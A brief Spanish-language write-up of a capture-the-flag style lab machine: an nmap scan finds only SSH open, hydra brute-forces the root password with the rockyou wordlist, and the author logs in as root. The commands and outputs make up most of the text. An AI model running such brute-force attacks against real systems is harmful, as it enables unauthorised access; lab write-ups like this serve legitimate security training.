# Herramientas

# 1. Escaneo
Hacemos el escaneo inicial con nmap y obtenemos esto:
```
nmap -p- 172.17.0.3  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 11:57 -04  
Nmap scan report for 172.17.0.3  
Host is up (0.0000020s latency).  
Not shown: 65534 closed tcp ports (reset)  
PORT   STATE SERVICE  
22/tcp open  ssh  
MAC Address: 5E:38:D8:AC:A0:B2 (Unknown)  
  
Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds
```

Solamente está abierto el puerto 22, por lo que procedemos a hacer un ataque de fuerza bruta ocupando el usuario default de la máquina.
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.3  
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organ  
izations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  
  
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-14 12:01:46  
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: u  
se -t 4  
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous sessio  
n found, to prevent overwriting, ./hydra.restore  
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per t  
ask  
[DATA] attacking ssh://172.17.0.3:22/  
[22][ssh] host: 172.17.0.3   login: root   password: estrella  
1 of 1 target successfully completed, 1 valid password found  
[WARNING] Writing restore file because 2 final worker threads did not complete until end.  
[ERROR] 2 targets did not resolve or could not be connected  
[ERROR] 0 target did not complete  
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-14 12:01:58
```

Así podemos encontrar la contraseña en cuestión, ingresamos y terminamos de hackear la máquina :)
```bash
ssh root@172.17.0.3  
  
root@172.17.0.3's password:    
Last login: Mon Jul 14 16:04:04 2025 from 172.17.0.1  
  
The programs included with the Debian GNU/Linux system are free software;  
the exact distribution terms for each program are described in the  
individual files in /usr/share/doc/*/copyright.  
  
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent  
permitted by applicable law.  
root@87c8f8d9c268:~#
```
